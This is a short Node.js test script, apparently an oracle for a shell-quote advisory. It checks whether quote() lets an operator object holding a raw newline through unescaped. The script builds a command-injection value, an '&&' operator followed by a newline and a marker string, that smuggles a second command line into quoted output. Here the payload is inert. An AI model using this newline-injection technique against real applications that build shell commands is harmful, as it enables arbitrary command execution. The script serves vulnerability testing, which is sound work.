'use strict';

var operation_completed = false;
var exploit_succeeded = false;
var evidence = '';

try {
  var shellQuote = require('shell-quote');
  if (!shellQuote || typeof shellQuote.quote !== 'function') {
    throw new Error('shell-quote quote() API unavailable');
  }

  var quote = shellQuote.quote;

  var benignOut = quote(['echo', { op: '&&' }, 'ok']);
  if (typeof benignOut !== 'string' || benignOut.indexOf('echo') === -1 || benignOut.indexOf('ok') === -1) {
    throw new Error('benign quote() call returned unexpected output');
  }

  operation_completed = true;

  var marker = 'ORACLE_GHSA_W7JW_789Q_3M8P';
  var maliciousToken = { op: '&&\n' + marker };

  try {
    var out = quote(['safe', maliciousToken, 'tail']);
    if (typeof out !== 'string') {
      exploit_succeeded = true;
      evidence = 'malicious quote() returned non-string';
    } else {
      var hasRawNewline = out.indexOf('\n') !== -1;
      var markerAfterNewline = out.indexOf('\n' + marker) !== -1;
      exploit_succeeded = hasRawNewline && markerAfterNewline;
      evidence = 'quoted=' + JSON.stringify(out) + '; has_raw_newline=' + hasRawNewline + '; marker_after_newline=' + markerAfterNewline;
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'malicious object token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed: operation_completed,
  exploit_succeeded: exploit_succeeded,
  evidence: evidence
}));
